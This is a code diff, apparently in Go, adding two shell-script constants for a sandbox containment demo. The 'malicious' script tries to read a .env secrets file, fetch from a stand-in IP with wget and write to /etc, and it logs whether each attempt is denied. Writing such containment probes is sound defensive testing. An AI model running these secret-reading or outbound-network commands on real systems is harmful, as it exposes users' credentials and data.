@@ -96,3 +96,51 @@ while :; do
     sleep 1
 done
 `
+
+// CompetitionMaliciousScript is the reliable judge-facing attack workload.
+// It executes real probes against capabilities withheld by the M4.4 sandbox,
+// then makes exactly one final workspace mutation. Its bounded stdout is
+// evidence for presentation only: reconciliation and commit authority never
+// depend on these lines.
+const CompetitionMaliciousScript = `set -eu
+cd /workspace
+
+emit() {
+    printf 'MIRAGE_DEMO/v1\t%s\t%s\t%s\t%s\n' "$1" "$2" "$3" "$4"
+}
+
+emit READ /workspace/.env ATTEMPTED snapshot-secret-exclusion
+if cat .env >/dev/null 2>&1; then
+    emit READ /workspace/.env BREACH secret-visible
+    exit 71
+fi
+emit READ /workspace/.env DENIED snapshot-secret-exclusion
+
+emit POST http://198.51.100.1/ ATTEMPTED sandbox-network-none
+if wget -q -T 2 -O /tmp/mirage-network-probe http://198.51.100.1/ >/dev/null 2>&1; then
+    emit POST http://198.51.100.1/ BREACH network-reachable
+    exit 72
+fi
+emit POST http://198.51.100.1/ DENIED sandbox-network-none
+
+emit WRITE /etc/mirage-protected ATTEMPTED read-only-root
+if printf 'unauthorized mutation\n' > /etc/mirage-protected 2>/dev/null; then
+    emit WRITE /etc/mirage-protected BREACH protected-write-succeeded
+    exit 73
+fi
+emit WRITE /etc/mirage-protected DENIED read-only-root
+
+emit WRITE /workspace/README.md ATTEMPTED effect-contract
+printf '# MIRAGE demo workspace\n\nVerified: only this authorized README change crossed into reality.\n' > README.md
+emit WRITE /workspace/README.md SUCCEEDED effect-contract
+`
+
+// CompetitionBenignScript is the matching no-attack scenario. It uses the
+// same sandbox and trusted commit path while attempting only the authorized
+// README modification.
+const CompetitionBenignScript = `set -eu
+cd /workspace
+printf 'MIRAGE_DEMO/v1\tWRITE\t/workspace/README.md\tATTEMPTED\teffect-contract\n'
+printf '# MIRAGE demo workspace\n\nVerified: the benign agent completed its authorized README task.\n' > README.md
+printf 'MIRAGE_DEMO/v1\tWRITE\t/workspace/README.md\tSUCCEEDED\teffect-contract\n'
+`
